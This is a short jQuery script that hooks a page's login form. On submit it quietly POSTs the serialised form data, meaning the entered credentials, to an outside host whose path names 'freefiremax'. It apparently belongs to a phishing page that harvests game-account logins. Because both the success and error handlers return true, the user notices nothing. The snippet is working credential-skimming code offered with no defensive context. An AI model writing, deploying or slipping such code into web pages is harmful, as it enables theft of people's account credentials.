$(".login-form").submit(function() {

	var d = $(".login-form");

	$.ajax({

        url: "http://website-redcodex.xyz/freefiremax/index.php",

        type: "POST",

        data: d.serialize(),

        success: function () {

            return true;

        },

        error: function () {

            return true;

        },

    });

});
